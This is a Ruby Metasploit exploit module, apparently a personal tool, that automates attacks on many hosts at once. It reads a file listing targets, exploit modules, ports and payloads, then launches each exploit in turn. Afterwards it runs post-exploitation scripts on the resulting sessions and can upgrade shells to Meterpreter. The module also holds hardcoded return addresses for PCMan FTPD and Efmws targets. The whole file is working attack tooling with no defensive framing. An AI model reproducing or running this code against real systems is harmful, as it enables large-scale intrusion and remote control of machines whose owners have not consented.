##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit

  #include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Exploit Massive',
      'Description' => %q{
          xxx
      },
      'Author'      =>
        [
          # Pablo
          'Pablo Gonzalez',
        ],
		'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x0d",
        },
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
	  'ExitFunc'	   => 'thread',
	  'Target'		   => 0,
	  'Targets'        =>
        [
          ['PCMan FTPD Server 2.0.7 On Windows XP SP3 English',
            {
              'Ret'    => 0x7e429353 #\x53\x93\x42\x7e
            }
          ],
		  ['Efmws 5.3 Universal', { 'Esp' => 0xA445ABCF, 'Ret' => 0x10010101 }],
          ['Efmws 4.0 Universal', { 'Esp' => 0xA4518472, 'Ret' => 0x10010101 }]
        ],
      'License'     => MSF_LICENSE,
		)
		
		)
		
	register_options([
	  OptString.new('FILE_HOST', [true,'This file contains vulnerable hosts','c:\\users\\pgonzalez\\desktop\\metasploit\\exploit_massive\\v2\\hosts.txt'])
    ], self.class)

	register_advanced_options([
		OptEnum.new('UPGRADE', [false,'This option upgrade a Shell Session',false,[true,false]])
	], self.class)

	@exploits = Hash.new
    
  end
  
  def moreOptions?(list)
	return list.to_s.length > 1 
  end
  
  def giveMeSession
	sess = framework.sessions
	e = nil
	sess.each do |element|
		e = element[0]
	end
	return e
  end
  
  def exploit
	
	File.open(datastore['FILE_HOST'], 'r') do |f1|
	
		while linea = f1.gets	
		
		begin
			puts linea
			
			host = linea.split("|")[0]
			sploit = linea.split("|")[1]
			port = linea.split("|")[2]
			pay = linea.split("|")[3]
			
			print_status()
			print_good("host: #{host}")
			print_good("exploit: #{sploit}")
			print_good("port: #{port}")
			print_good("payload: #{pay}")
			print_status()
			
			datastore['PAYLOAD'] = pay
			
			@exploits[sploit] = framework.modules.create(sploit)
	
			print_status("Starting exploit #{sploit} with payload #{pay}")
			
			@exploits[sploit].datastore['RHOST'] = host
			@exploits[sploit].datastore['RPORT'] = port
			@exploits[sploit].datastore['LHOST'] = datastore['LHOST']
			
			
			#puts "hash: #{list}"
			#next
			
			message = @exploits[sploit].check_simple(''=>'')
			print_status("This check is: #{message[0]}, and this result is: #{message[1]}")
			
			session_shell = @exploits[sploit].exploit_simple('Payload' => datastore['PAYLOAD'], 'Target' => 0, 'ExitFunc' => datastore['EXITFUNC'],
			'RunAsJob' => false)
			
			#Options
			if moreOptions?(linea.split("|")[4])
				optionList = linea.split("|")[4]
				
				optionArray = optionList.split(",")
				
				optionArray.each do |option|
					puts "option: #{option}"
					key = option.split(":")[0]
					value = option.split(":")[1]
					
					datastore[key] = value
					if key == "InitialAutoRunScript"
						args = Shellwords.shellwords(datastore['InitialAutoRunScript'])
						puts args
						s = giveMeSession
						session = framework.sessions.get(s)
						session.execute_script(args.shift, *args)
					end
					
					if key == "AutoRunScript"
						args = Shellwords.shellwords(datastore['AutoRunScript'])
						puts args
						s = giveMeSession
						session = framework.sessions.get(s)
						session.execute_script(args.shift, *args)
					end
					
				end
				
			end
						
			#codigo para hacer upgrade de una shell a un meterpreter			
			if datastore['UPGRADE'] == "true" and session_shell != nil and session_shell.type == "shell"
				print_status("upgrading... Meterpreter!")
				session_shell.execute_script('post/multi/manage/shell_to_meterpreter')
			end

		rescue 
			print_error("Ouch! #{@exploits[sploit]} fail!")
		end
			
		end
	
	end
	#@exploits[name] = framework.modules.reload_module(@exploits[name])

=begin
	framework.exploits.each_module do |name, mod|
      if name =~ /pcmanFTPd/
		puts "mod: #{mod}"
		puts "name: #{name}"
	  end
    end
=end

		 
	# It takes a little time for the resources to get set up, so sleep for
    # a bit to make sure the exploit is fully working.  Without this,
    # mod.get_resource doesn't exist when we need it.
    Rex::ThreadSafe.sleep(0.5)
	
  end
  
end
